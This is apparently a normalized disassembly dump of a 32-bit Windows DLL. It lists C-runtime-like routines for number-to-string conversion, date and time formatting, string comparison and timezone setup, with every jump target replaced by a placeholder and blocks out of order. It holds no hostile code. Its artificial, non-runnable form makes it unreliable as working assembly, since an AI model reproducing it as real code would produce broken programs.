cmp [ ebp + 0x10 ] ebx
mov [ esi ] bl
setne cl
inc ecx
cmp [ ebp + 0x8 ] ecx
ja r-xdata
call sub_1006299d
push 0x16
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ ebp + 0xc ]
add ecx 0xfffffffe
cmp ecx 0x22
ja r-xdata
call sub_1006299d
push 0x22
jmp r-xdata
pop edi
mov ecx esi
cmp [ ebp + 0x10 ] ebx
je r-xdata
pop esi
mov [ eax ] esi
call sub_100427ff
mov eax esi
jmp r-xdata
mov edi ecx
xor ebx ebx
inc ebx
mov [ esi ] 0x2d
lea ecx [ esi + 0x1 ]
neg eax
add dl 0x30
add dl 0x57
jmp r-xdata
cmp ebx [ ebp + 0x8 ]
jb r-xdata
cmp ebx [ ebp + 0x8 ]
jb r-xdata
mov [ ecx ] dl
inc ecx
inc ebx
test eax eax
je r-xdata
mov [ ecx ] 0x0
dec ecx
mov [ esi ] 0x0
jmp r-xdata
xor edx edx
div [ ebp + 0xc ]
cmp edx 0x9
jbe r-xdata
mov dl [ edi ]
mov al [ ecx ]
mov [ ecx ] dl
dec ecx
mov [ edi ] al
inc edi
cmp edi ecx
jb r-xdata
xor eax eax
sub_10083a59
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
xor ecx ecx
push esi
cmp edi ecx
jne r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
call sub_1006299d
push 0x16
xor eax eax
cmp [ ebp + 0x18 ] ecx
mov [ edi ] cl
setne al
inc eax
cmp [ ebp + 0x10 ] eax
ja r-xdata
pop esi
leave
retn 0x14
mov eax [ ebp + 0x14 ]
add eax 0xfffffffe
cmp eax 0x22
ja r-xdata
call sub_1006299d
push 0x22
jmp r-xdata
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ecx
mov esi edi
cmp [ ebp + 0x18 ] ecx
je r-xdata
pop esi
mov [ eax ] esi
mov [ ebp + 0x18 ] esi
mov [ ebp + 0xc ] ecx
neg ebx
adc eax ecx
mov [ edi ] 0x2d
lea esi [ edi + 0x1 ]
mov [ ebp - 0x4 ] 0x1
neg eax
add cl 0x30
add cl 0x57
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
jb r-xdata
test ebx ebx
je r-xdata
mov [ esi ] cl
mov ecx [ ebp - 0x4 ]
inc esi
inc ecx
mov [ ebp - 0x4 ] ecx
test eax eax
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x14 ]
push eax
push ebx
call sub_100823c0
mov [ ebp - 0x8 ] ebx
mov ebx eax
mov eax edx
cmp ecx 0x9
jbe r-xdata
mov ecx [ ebp - 0x4 ]
pop ebx
cmp ecx [ ebp + 0x10 ]
jb r-xdata
mov [ esi ] 0x0
dec esi
mov [ edi ] 0x0
call sub_1006299d
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov dl [ eax ]
mov cl [ esi ]
mov [ esi ] dl
dec esi
mov [ eax ] cl
inc eax
mov [ ebp + 0x18 ] eax
cmp eax esi
jb r-xdata
xor eax eax
call sub_100427ff
mov eax esi
jmp r-xdata
sub_10083b45
xor eax eax
test bl 0x10
je r-xdata
test bl 0x8
je r-xdata
inc eax
test bl 0x4
je r-xdata
or eax 0x4
test bl 0x2
je r-xdata
or eax 0x8
test bl 0x1
je r-xdata
or eax 0x10
test ebx 0x80000
je r-xdata
or eax 0x20
mov ecx ebx
mov edx 0x300
and ecx edx
push esi
mov esi 0x200
je r-xdata
or eax 0x2
mov ecx ebx
and ecx 0x30000
je r-xdata
cmp ecx 0x100
je r-xdata
or eax edx
cmp ecx 0x10000
jne r-xdata
or eax 0x400
cmp ecx esi
je r-xdata
retn
or eax 0x1000
pop esi
test ebx 0x40000
je r-xdata
or eax esi
jmp r-xdata
or eax 0x800
jmp r-xdata
cmp ecx edx
jne r-xdata
or eax 0xc00
jmp r-xdata
sub_10083bd3
xor eax eax
test dl 0x10
je r-xdata
push ebx
push esi
push edi
mov ebx 0x200
test dl 0x8
je r-xdata
mov eax 0x80
test dl 0x4
je r-xdata
or eax ebx
test dl 0x2
je r-xdata
or eax 0x400
test dl 0x1
je r-xdata
or eax 0x800
mov edi 0x100
test edx 0x80000
je r-xdata
or eax 0x1000
mov ecx edx
mov esi 0x300
and ecx esi
je r-xdata
or eax edi
mov ecx 0x3000000
pop edi
and edx ecx
pop esi
pop ebx
cmp edx 0x1000000
je r-xdata
cmp ecx edi
je r-xdata
or eax 0x8040
cmp edx 0x2000000
je r-xdata
or eax 0x2000
cmp ecx ebx
je r-xdata
or eax 0x40
retn
cmp edx ecx
jne r-xdata
or eax 0x4000
jmp r-xdata
cmp ecx esi
jne r-xdata
retn
or eax 0x8000
retn
or eax 0x6000
jmp r-xdata
sub_10083c73
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_10034e98
push rw-data
call sub_100187c9
and [ rw-data ] 0x0
pop ecx
lea ecx [ ebp - 0x4 ]
call sub_10069747
leave
retn
sub_10083c9f
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0xa
push 0x1f
lea eax [ ebp - 0x23 ]
push eax
push 0x0
push [ ebp + 0x8 ]
mov [ ebp - 0x24 ] 0x2e
call sub_100356d4
lea eax [ ebp - 0x24 ]
push eax
push 0x0
call sub_10023c9a
mov ecx [ ebp - 0x4 ]
xor ecx ebp
add esp 0x1c
call sub_10001e8b
leave
retn
sub_10083ce3
push ebx
push esi
push edi
mov ebx rw-data
add ebx 0x4
cmp ebx rw-data
jl r-xdata
push [ esi + 0x8 ]
mov edi [ esi ]
call sub_1005601d
push esi
call sub_10035d06
pop ecx
pop ecx
mov esi edi
test edi edi
jne r-xdata
push 0x0
push ebx
call [ InterlockedExchange@IAT ]
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_10083d3a
cmp [ eax ] 0x0
push esi
mov esi edx
je r-xdata
pop esi
retn
push edi
pop edi
mov edi [ ecx ]
mov [ edi ] dl
inc [ ecx ]
inc esi
dec [ eax ]
cmp [ eax ] 0x0
jne r-xdata
mov dl [ esi ]
test dl dl
je r-xdata
sub_10083d5a
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
xor edx edx
mov [ ebp - 0x4 ] edx
cmp [ ebp + 0x8 ] edx
je r-xdata
cmp esi [ ecx ]
jae r-xdata
cmp [ ecx ] 0x1
mov esi [ edi ]
jbe r-xdata
mov [ ecx ] edx
dec esi
lea edx [ esi + 0x1 ]
test edx edx
je r-xdata
mov eax [ edi ]
mov [ edi ] esi
dec esi
push 0xa
cdq
pop ebx
idiv ebx
add dl 0x30
mov [ esi ] dl
inc esi
dec [ ecx ]
mov edx [ ecx ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
add [ edi ] eax
sub [ ecx ] eax
jmp r-xdata
push 0xa
cdq
pop ebx
idiv ebx
mov ebx [ edi ]
add dl 0x30
inc [ ebp - 0x4 ]
mov [ esi + ebx ] dl
dec esi
cmp esi 0xffffffff
jne r-xdata
mov dl [ eax ]
mov cl [ esi ]
mov [ esi ] dl
dec esi
mov [ eax ] cl
inc eax
cmp eax esi
jb r-xdata
jmp r-xdata
cmp edx 0x1
ja r-xdata
pop esi
pop ebx
leave
retn
sub_10083dd5
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
movsx eax al
push esi
mov esi [ ebp + 0xc ]
push edi
mov ebx ecx
mov edi edx
cmp eax 0x59
jg r-xdata
cmp eax 0x6d
jg r-xdata
je r-xdata
sub eax 0x70
je r-xdata
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0xfffff894
jl r-xdata
cmp eax 0x49
jg r-xdata
mov esi [ esi + 0x8 ]
test esi esi
js r-xdata
sub eax 0x7
je r-xdata
mov esi [ esi + 0x10 ]
test esi esi
js r-xdata
sub eax 0x5a
je r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
cmp eax 0x1fa3
jg r-xdata
sub eax 0x4d
je r-xdata
je r-xdata
cmp esi 0x17
jg r-xdata
mov eax [ esi + 0x18 ]
test eax eax
js r-xdata
dec eax
je r-xdata
cmp esi 0xb
jg r-xdata
call sub_1001df0c
call sub_10046f04
mov edx eax
xor eax eax
cmp [ esi + 0x20 ] eax
setne al
mov [ ebp - 0x4 ] eax
mov eax ebx
mov ebx [ ebp - 0x4 ]
mov edx [ edx + ebx * 4 ]
jmp r-xdata
sub eax 0x7
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cdq
push 0x64
pop ecx
idiv ecx
push [ ebp + 0x14 ]
mov ecx ebx
push 0x4
add eax 0x13
imul eax eax 0x64
add eax edx
jmp r-xdata
mov eax [ esi + 0x4 ]
test eax eax
js r-xdata
push 0x6
pop ecx
sub eax ecx
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
js r-xdata
sub eax 0x4
je r-xdata
mov edx [ ebp + 0x10 ]
cmp esi 0xb
jg r-xdata
cmp eax 0x6
jg r-xdata
cmp [ ebp + 0x14 ] 0x0
push [ ebp + 0x10 ]
push ebx
push edi
push esi
je r-xdata
dec eax
je r-xdata
lea eax [ esi + 0x1 ]
jmp r-xdata
mov ecx edi
call sub_10083d3a
mov esi [ esi + 0x18 ]
test esi esi
js r-xdata
dec eax
je r-xdata
pop edx
cmp eax 0x3b
jmp r-xdata
mov eax [ esi ]
test eax eax
js r-xdata
dec eax
dec eax
je r-xdata
cmp esi 0x17
jg r-xdata
xor eax eax
inc eax
sub eax 0x9
je r-xdata
mov edx [ edx + 0x9c ]
mov edx [ edx + 0x98 ]
jmp r-xdata
push [ ebp + 0x14 ]
xor edx edx
inc edx
jmp r-xdata
push 0x0
jmp r-xdata
push 0x1
jmp r-xdata
mov eax [ esi + 0x14 ]
test eax eax
js r-xdata
dec eax
jne r-xdata
push [ ebp + 0x14 ]
cmp esi 0x6
jle r-xdata
mov esi [ esi + 0x10 ]
test esi esi
js r-xdata
dec eax
je r-xdata
jg r-xdata
cmp eax 0x3b
jg r-xdata
mov eax [ esi + 0x18 ]
test eax eax
js r-xdata
dec eax
dec eax
je r-xdata
mov eax esi
cdq
push 0xc
pop ecx
idiv ecx
mov eax edx
test eax eax
jne r-xdata
sub eax 0x18
je r-xdata
mov eax ebx
call sub_10083d5a
pop ecx
jmp r-xdata
push [ ebp + 0x8 ]
call sub_1008418d
add esp 0x18
test eax eax
jne r-xdata
push [ ebp + 0x14 ]
cdq
push 0x64
pop ecx
idiv ecx
mov ecx ebx
mov eax edx
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp + 0x10 ]
mov edx [ edx + esi * 4 ]
jmp r-xdata
cmp esi 0xb
jg r-xdata
cmp [ ebp + 0x14 ] 0x0
push [ ebp + 0x10 ]
push ebx
push edi
push esi
je r-xdata
dec eax
je r-xdata
jmp r-xdata
jmp r-xdata
cmp eax ecx
jg r-xdata
mov eax [ esi + 0x18 ]
test eax eax
js r-xdata
dec eax
jne r-xdata
mov ecx ebx
jmp r-xdata
push ecx
pop eax
mov eax [ edi ]
mov [ eax ] 0x25
inc [ edi ]
dec [ ebx ]
jmp r-xdata
sub eax 0x1c
je r-xdata
jmp r-xdata
push 0x2
mov edx [ ebp + 0x10 ]
mov edx [ edx + esi * 4 + 0x38 ]
jmp r-xdata
push 0x0
jmp r-xdata
push 0x1
mov esi [ esi + 0xc ]
cmp esi 0x1
jl r-xdata
sub eax 0x6
jne r-xdata
mov ecx eax
cmp eax ecx
jg r-xdata
jmp r-xdata
mov esi [ esi + 0x18 ]
test esi esi
js r-xdata
dec eax
je r-xdata
push [ ebp + 0x8 ]
call sub_1008418d
add esp 0x18
test eax eax
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp esi 0x1f
jg r-xdata
mov esi [ esi + 0x1c ]
test esi esi
js r-xdata
cmp eax 0x16d
jg r-xdata
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push ebx
push edi
push esi
push 0x2
cmp esi 0x6
jg r-xdata
mov esi [ esi + 0x10 ]
test esi esi
js r-xdata
sub eax 0x6
jne r-xdata
mov eax [ edi ]
mov [ eax ] 0x20
inc [ edi ]
dec [ ebx ]
mov eax esi
cmp esi 0x16d
jg r-xdata
cmp eax ecx
jge r-xdata
mov eax [ esi + 0x1c ]
test eax eax
js r-xdata
lea ecx [ eax - 0x1 ]
jmp r-xdata
mov edx [ ebp + 0x10 ]
mov edx [ edx + esi * 4 + 0x1c ]
jmp r-xdata
cmp esi 0xb
jg r-xdata
mov eax [ esi + 0x8 ]
test eax eax
js r-xdata
push [ ebp + 0x14 ]
lea eax [ esi + 0x1 ]
push 0x3
jmp r-xdata
push 0x7
cdq
pop esi
idiv esi
cmp edx ecx
jl r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp + 0x10 ]
mov edx [ edx + esi * 4 + 0x68 ]
jmp r-xdata
cmp eax 0x17
inc eax
jmp r-xdata
sub_1008418d
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
sub ecx 0x0
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x18 ]
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x1c ]
push edi
mov [ ebp - 0x24 ] eax
je r-xdata
mov edi [ eax + 0xa0 ]
dec ecx
je r-xdata
mov al [ edi ]
test al al
jne r-xdata
cmp [ ebp + 0xc ] 0x2
mov eax [ GetDateFormatA@IAT ]
jne r-xdata
mov edi [ eax + 0xa4 ]
jmp r-xdata
mov edi [ eax + 0xa8 ]
jmp r-xdata
xor edx edx
cmp [ ebx ] edx
je r-xdata
jmp r-xdata
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x28 ]
mov ecx 0x76c
add cx [ eax + 0x14 ]
mov [ ebp - 0x14 ] cx
mov cx [ eax + 0x10 ]
inc cx
mov [ ebp - 0x12 ] cx
mov cx [ eax + 0xc ]
mov [ ebp - 0xe ] cx
mov cx [ eax + 0x8 ]
mov [ ebp - 0xc ] cx
mov cx [ eax + 0x4 ]
mov ax [ eax ]
mov [ ebp - 0x8 ] ax
xor eax eax
push eax
push eax
push edi
mov [ ebp - 0xa ] cx
lea ecx [ ebp - 0x14 ]
push ecx
push eax
mov [ ebp - 0x6 ] ax
mov eax [ ebp - 0x24 ]
push [ eax + 0xac ]
call [ ebp - 0x2c ]
mov [ ebp - 0x30 ] eax
test eax eax
je r-xdata
mov eax [ GetTimeFormatA@IAT ]
cmp [ eax + 0xb0 ] 0x1
je r-xdata
xor eax eax
inc eax
mov [ ebp - 0x18 ] edx
mov ecx edi
add eax 0x8
cmp eax 0x400
jg r-xdata
inc ecx
inc edx
cmp [ ecx ] al
je r-xdata
mov [ ebp - 0x1c ] ecx
movsx ecx al
cmp ecx 0x64
jg r-xdata
push eax
call sub_1000b33e
pop ecx
test eax eax
je r-xdata
call sub_10082ff0
mov eax esp
test eax eax
je r-xdata
mov eax ecx
sub eax 0x68
je r-xdata
je r-xdata
mov [ ebp - 0x18 ] eax
test eax eax
je r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
mov eax edx
dec eax
je r-xdata
sub eax 0x5
je r-xdata
mov eax edx
dec eax
je r-xdata
cmp ecx 0x27
je r-xdata
push [ ebp - 0x30 ]
mov [ ebp - 0x1c ] eax
push eax
push edi
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x24 ]
push 0x0
push [ eax + 0xac ]
call [ ebp - 0x2c ]
dec eax
test eax eax
jle r-xdata
add eax 0x8
mov [ ebp - 0x18 ] 0x1
dec eax
je r-xdata
mov eax edx
dec eax
je r-xdata
sub eax 0x6
je r-xdata
mov [ ebp - 0x18 ] 0x1
dec eax
je r-xdata
add edi edx
test dl 0x1
je r-xdata
cmp ecx 0x41
je r-xdata
push [ ebp - 0x18 ]
call sub_10007442
pop ecx
mov edi [ ebp - 0x1c ]
xor eax eax
jmp r-xdata
mov edi [ ebp - 0x1c ]
jmp r-xdata
mov al 0x49
jmp r-xdata
mov [ ebp - 0x18 ] 0x1
dec eax
je r-xdata
mov eax edx
dec eax
je r-xdata
dec eax
je r-xdata
push [ ebp - 0x18 ]
mov ecx ebx
push [ ebp - 0x24 ]
mov edx esi
push [ ebp - 0x28 ]
push [ ebp - 0x20 ]
call sub_10083dd5
add esp 0x10
test eax eax
je r-xdata
mov al 0x64
jmp r-xdata
dec eax
je r-xdata
mov al [ edi ]
test al al
je r-xdata
push r--data
push edi
call sub_100136d5
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp ecx 0x48
je r-xdata
mov dl [ edi ]
mov ecx [ esi ]
mov [ ecx ] dl
inc [ esi ]
inc edi
dec [ ebx ]
dec eax
test eax eax
jg r-xdata
lea esp [ ebp - 0x3c ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
leave
retn
push [ ebp - 0x20 ]
push ecx
call sub_10007b46
pop ecx
pop ecx
test eax eax
je r-xdata
mov al 0x4d
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x18 ] 0x1
dec eax
je r-xdata
mov eax [ ebp - 0x28 ]
cmp [ eax + 0x8 ] 0xb
mov eax [ ebp - 0x24 ]
jg r-xdata
sub eax 0x5
jne r-xdata
mov al 0x61
jmp r-xdata
dec eax
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
push r--data
push edi
call sub_100136d5
pop ecx
pop ecx
test eax eax
jne r-xdata
add edi 0x5
jmp r-xdata
mov eax edx
dec eax
je r-xdata
cmp ecx 0x4d
je r-xdata
cmp [ ebx ] 0x0
jbe r-xdata
mov cl [ edi ]
mov eax [ esi ]
mov [ eax ] cl
inc [ esi ]
inc edi
dec [ ebx ]
cmp [ ebx ] 0x1
jbe r-xdata
mov al 0x53
jmp r-xdata
jmp r-xdata
mov edi [ eax + 0x9c ]
mov edi [ eax + 0x98 ]
jmp r-xdata
lea eax [ edx - 0x1 ]
dec eax
je r-xdata
mov al 0x41
jmp r-xdata
cmp al 0x27
je r-xdata
mov al 0x70
jmp r-xdata
add edi 0x3
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] 0x1
dec eax
je r-xdata
mov eax edx
dec eax
je r-xdata
cmp ecx 0x61
je r-xdata
cmp [ edi + 0x1 ] 0x0
je r-xdata
mov al [ edi ]
test al al
jne r-xdata
cmp [ ebx ] 0x0
jbe r-xdata
cmp edx 0x1
jne r-xdata
mov al 0x79
jmp r-xdata
dec eax
dec eax
jne r-xdata
inc edi
jmp r-xdata
push [ ebp - 0x20 ]
movsx eax al
push eax
call sub_10007b46
pop ecx
pop ecx
test eax eax
je r-xdata
mov al 0x48
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x18 ] 0x1
dec eax
je r-xdata
mov dl [ edi ]
mov ecx [ esi ]
mov [ ecx ] dl
inc [ esi ]
inc edi
dec [ ebx ]
cmp [ ebx ] 0x0
jbe r-xdata
jmp r-xdata
movsx eax [ edi ]
push [ ebp - 0x20 ]
push eax
call sub_10007b46
pop ecx
pop ecx
test eax eax
je r-xdata
mov al 0x59
jmp r-xdata
mov eax [ esi ]
mov cl [ edi ]
mov [ eax ] cl
inc [ esi ]
inc edi
dec [ ebx ]
mov al [ edi ]
test al al
jne r-xdata
cmp [ ebx ] 0x1
jbe r-xdata
mov al 0x6d
jmp r-xdata
dec eax
je r-xdata
push [ ebp - 0x20 ]
movsx eax al
push eax
call sub_10007b46
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ esi ]
mov cl [ edi ]
mov [ eax ] cl
inc [ esi ]
dec [ ebx ]
jmp r-xdata
cmp [ ebx ] 0x1
jbe r-xdata
jmp r-xdata
cmp [ edi + 0x1 ] 0x0
je r-xdata
mov al 0x62
jmp r-xdata
dec eax
jne r-xdata
mov cl [ edi ]
mov eax [ esi ]
mov [ eax ] cl
inc [ esi ]
inc edi
dec [ ebx ]
cmp [ ebx ] 0x1
jbe r-xdata
cmp [ edi + 0x1 ] 0x0
je r-xdata
mov dl [ edi ]
mov ecx [ esi ]
mov [ ecx ] dl
inc [ esi ]
inc edi
dec [ ebx ]
mov al 0x42
jmp r-xdata
cmp [ edi + 0x1 ] 0x0
je r-xdata
mov dl [ edi ]
mov ecx [ esi ]
mov [ ecx ] dl
inc [ esi ]
inc edi
dec [ ebx ]
mov dl [ edi ]
mov ecx [ esi ]
mov [ ecx ] dl
inc [ esi ]
inc edi
dec [ ebx ]
sub_100845f0
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_10084658
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov ebx ecx
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
test edi edi
jle r-xdata
cmp edi 0xffffffff
jge r-xdata
mov ecx edi
mov esi [ ebp + 0x18 ]
test esi esi
jle r-xdata
xor eax eax
jmp r-xdata
or eax 0xffffffff
sub eax ecx
add edi eax
mov [ ebp + 0x14 ] edi
inc eax
test ecx ecx
jne r-xdata
cmp esi 0xffffffff
jl r-xdata
mov ecx esi
mov eax edx
lea esp [ ebp - 0x38 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
leave
retn
dec ecx
cmp [ eax ] 0x0
je r-xdata
or ecx 0xffffffff
and [ ebp - 0x28 ] 0x0
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
or eax 0xffffffff
sub eax ecx
add esi eax
mov [ ebp + 0x18 ] esi
jmp r-xdata
inc eax
test ecx ecx
jne r-xdata
test edi edi
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
dec ecx
cmp [ eax ] 0x0
je r-xdata
or ecx 0xffffffff
cmp edi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
inc ebx
cmp esi ebx
jle r-xdata
push 0x2
mov esi [ MultiByteToWideChar@IAT ]
push 0x0
push 0x0
push edi
push [ ebp - 0x24 ]
push 0x9
push [ ebp + 0x1c ]
call esi
mov ebx eax
mov [ ebp - 0x2c ] ebx
test ebx ebx
je r-xdata
cmp edi ebx
jle r-xdata
mov eax ebx
jmp r-xdata
mov edi 0x400
jle r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0x1c ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
push 0x3
jmp r-xdata
and [ ebp - 0x1c ] 0x0
push 0xffffffe0
xor edx edx
pop eax
div ebx
cmp eax 0x2
jb r-xdata
test edi edi
jle r-xdata
pop eax
jmp r-xdata
push ebx
push [ ebp - 0x1c ]
push [ ebp + 0x14 ]
push [ ebp - 0x24 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ ebx + ebx + 0x8 ]
cmp eax edi
ja r-xdata
test esi esi
jle r-xdata
cmp [ ebp - 0x18 ] 0x2
jb r-xdata
push [ ebp - 0x1c ]
call sub_10007442
mov eax [ ebp - 0x28 ]
pop ecx
push 0x0
push 0x0
push [ ebp + 0x18 ]
push [ ebp - 0x20 ]
push 0x9
push [ ebp + 0x1c ]
call esi
mov ebx eax
test ebx ebx
je r-xdata
push eax
call sub_1000b33e
pop ecx
test eax eax
je r-xdata
call sub_10082ff0
mov eax esp
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x2
jb r-xdata
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
jle r-xdata
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div ebx
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
add eax 0x8
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
mov ecx [ ebp - 0x24 ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
push ebx
push edi
push [ ebp + 0x18 ]
push [ ebp - 0x20 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ ebx + ebx + 0x8 ]
cmp eax edi
ja r-xdata
mov ecx [ ebp - 0x20 ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
add eax 0x2
cmp [ eax ] 0x0
jne r-xdata
cmp cl dl
jbe r-xdata
push edi
call sub_10007442
pop ecx
push ebx
push edi
push [ ebp - 0x2c ]
push [ ebp - 0x1c ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringW@IAT ]
mov [ ebp - 0x28 ] eax
push eax
call sub_1000b33e
pop ecx
test eax eax
je r-xdata
call sub_10082ff0
mov eax esp
test eax eax
je r-xdata
add eax 0x2
cmp [ eax ] 0x0
jne r-xdata
cmp cl dl
jbe r-xdata
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
jmp r-xdata
test edi edi
je r-xdata
add eax 0x8
sub_100848c6
push 0x2c
push r--data
call sub_1007fb20
xor ebx ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x20 ] ebx
push 0x7
call sub_10058c10
pop ecx
mov [ ebp - 0x4 ] ebx
call sub_10046f04
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x1c ]
push eax
call sub_1004618b
pop ecx
cmp eax ebx
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1003cbb0
lea eax [ ebp - 0x24 ]
push eax
call sub_1005289c
pop ecx
cmp eax ebx
jne r-xdata
push rw-data
call [ GetTimeZoneInformation@IAT ]
cmp eax edi
je r-xdata
push eax
call sub_10035d06
pop ecx
mov [ rw-data ] ebx
lea eax [ ebp - 0x28 ]
push eax
call sub_10054047
pop ecx
cmp eax ebx
jne r-xdata
mov [ ebp - 0x2c ] 0x1
xor ecx ecx
inc ecx
mov [ rw-data ] ecx
mov eax [ rw-data ]
imul eax eax 0x3c
mov [ ebp - 0x1c ] eax
cmp [ rw-data ] bx
je r-xdata
call sub_100190d3
mov [ ebp - 0x34 ] eax
mov [ rw-data ] ebx
or edi 0xffffffff
mov [ rw-data ] edi
mov [ rw-data ] edi
push r--data
call sub_10067f24
pop ecx
mov esi eax
mov [ ebp - 0x3c ] esi
cmp esi ebx
je r-xdata
call sub_1007fb65
retn
push 0x3
push esi
push 0x40
mov edi [ ebp - 0x20 ]
push [ edi ]
call sub_10069c0f
add esp 0x10
test eax eax
jne r-xdata
cmp [ rw-data ] bx
je r-xdata
mov edx [ rw-data ]
imul edx edx 0x3c
add eax edx
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp [ esi ] bl
je r-xdata
add esi 0x3
cmp [ esi ] 0x2d
jne r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] ebx
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push esi
call sub_1002c5fc
pop ecx
imul eax eax 0xe10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x38 ] 0x1
inc esi
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov [ eax ] bl
cmp [ ebp - 0x30 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ecx
sub eax [ rw-data ]
imul eax eax 0x3c
mov [ ebp - 0x28 ] eax
jmp r-xdata
push esi
call sub_1007fa90
inc eax
push eax
call sub_1002fb6b
pop ecx
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
push eax
push esi
call sub_1007fc10
pop ecx
pop ecx
test eax eax
je r-xdata
inc esi
jmp r-xdata
cmp al 0x30
jl r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x4 ]
mov [ eax ] bl
cmp [ ebp - 0x30 ] ebx
jne r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov [ eax + 0x3f ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push ebx
push 0x3f
mov eax [ ebp - 0x20 ]
push [ eax ]
push edi
push rw-data
push ebx
